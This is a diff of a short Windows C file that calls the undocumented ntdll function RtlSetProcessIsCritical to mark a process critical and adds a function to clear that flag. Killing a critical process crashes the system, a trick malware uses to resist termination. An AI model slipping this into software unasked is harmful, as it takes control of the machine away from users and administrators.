@@ -1,22 +1,30 @@
 #include <windows.h>
 
-typedef void (_stdcall *RtlSetProcessIsCritical)(
- 	BOOLEAN NewValue,
- 	PBOOLEAN OldValue,
-	BOOLEAN IsWinlogon
-);
+typedef LONG (*pRtlSetProcessIsCritical)(BOOL,PBOOL,BOOL);
+pRtlSetProcessIsCritical SetCritical;
 
-bool Critic(){
+int SetIsCritic(void){
    HANDLE hNTDLL;
-   RtlSetProcessIsCritical SetCritical;
-
    hNTDLL = LoadLibraryA("ntdll.dll");
    if (hNTDLL != NULL){
-         (SetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hNTDLL, "RtlSetProcessIsCritical");
-         if(SetCritical){
+	   (SetCritical) = (pRtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hNTDLL, "RtlSetProcessIsCritical");
+	   if(SetCritical){
          	SetCritical(TRUE,NULL,FALSE);
-	 }
-   	return 1;
+	   }
+	   return 1;
+   }
+   return 0;
+}
+
+int SetNotCritic(void){
+   HANDLE hNTDLL;
+   hNTDLL = LoadLibraryA("ntdll.dll");
+   if (hNTDLL != NULL){
+	   (SetCritical) = (pRtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hNTDLL, "RtlSetProcessIsCritical");
+	   if(SetCritical){
+         	SetCritical(FALSE,NULL,FALSE);
+	   }
+	   return 1;
    }
    return 0;
 }
